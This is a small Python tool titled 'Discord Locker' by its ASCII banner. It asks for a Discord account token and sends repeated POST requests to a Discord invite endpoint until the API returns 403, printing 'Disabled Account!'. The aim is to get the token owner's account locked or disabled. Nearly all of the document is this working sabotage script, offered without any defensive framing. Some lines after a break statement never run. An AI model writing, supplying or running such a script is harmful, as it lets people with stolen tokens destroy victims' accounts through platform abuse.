import requests, time

def disable_account(token):
    baseurl = "https://discord.com/api/v9/invites/fortnite"
    headers = {
        "Authorization": f"{token}",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0",
        "Content-Type":"application/json"
    }
    while True:
        r = requests.post(baseurl, headers=headers)
        if r.status_code == 403:
            print("Disabled Account!")
            break
            time.sleep(3)
            main()
        else:
            print(f"Disabling account | {r.status_code}")

print("""\

▓█████▄  ██▓  ██████  ▄████▄   ▒█████   ██▀███  ▓█████▄     ██▓     ▒█████   ▄████▄   ██ ▄█▀▓█████  ██▀███  
▒██▀ ██▌▓██▒▒██    ▒ ▒██▀ ▀█  ▒██▒  ██▒▓██ ▒ ██▒▒██▀ ██▌   ▓██▒    ▒██▒  ██▒▒██▀ ▀█   ██▄█▒ ▓█   ▀ ▓██ ▒ ██▒
░██   █▌▒██▒░ ▓██▄   ▒▓█    ▄ ▒██░  ██▒▓██ ░▄█ ▒░██   █▌   ▒██░    ▒██░  ██▒▒▓█    ▄ ▓███▄░ ▒███   ▓██ ░▄█ ▒
░▓█▄   ▌░██░  ▒   ██▒▒▓▓▄ ▄██▒▒██   ██░▒██▀▀█▄  ░▓█▄   ▌   ▒██░    ▒██   ██░▒▓▓▄ ▄██▒▓██ █▄ ▒▓█  ▄ ▒██▀▀█▄  
░▒████▓ ░██░▒██████▒▒▒ ▓███▀ ░░ ████▓▒░░██▓ ▒██▒░▒████▓    ░██████▒░ ████▓▒░▒ ▓███▀ ░▒██▒ █▄░▒████▒░██▓ ▒██▒
 ▒▒▓  ▒ ░▓  ▒ ▒▓▒ ▒ ░░ ░▒ ▒  ░░ ▒░▒░▒░ ░ ▒▓ ░▒▓░ ▒▒▓  ▒    ░ ▒░▓  ░░ ▒░▒░▒░ ░ ░▒ ▒  ░▒ ▒▒ ▓▒░░ ▒░ ░░ ▒▓ ░▒▓░
 ░ ▒  ▒  ▒ ░░ ░▒  ░ ░  ░  ▒     ░ ▒ ▒░   ░▒ ░ ▒░ ░ ▒  ▒    ░ ░ ▒  ░  ░ ▒ ▒░   ░  ▒   ░ ░▒ ▒░ ░ ░  ░  ░▒ ░ ▒░
 ░ ░  ░  ▒ ░░  ░  ░  ░        ░ ░ ░ ▒    ░░   ░  ░ ░  ░      ░ ░   ░ ░ ░ ▒  ░        ░ ░░ ░    ░     ░░   ░ 
   ░     ░        ░  ░ ░          ░ ░     ░        ░           ░  ░    ░ ░  ░ ░      ░  ░      ░  ░   ░     
 ░                   ░                           ░                          ░                               
                                                                                                                                  
        """)
def main():
	token = input("Token: ")
	disable_account(token=token)

main()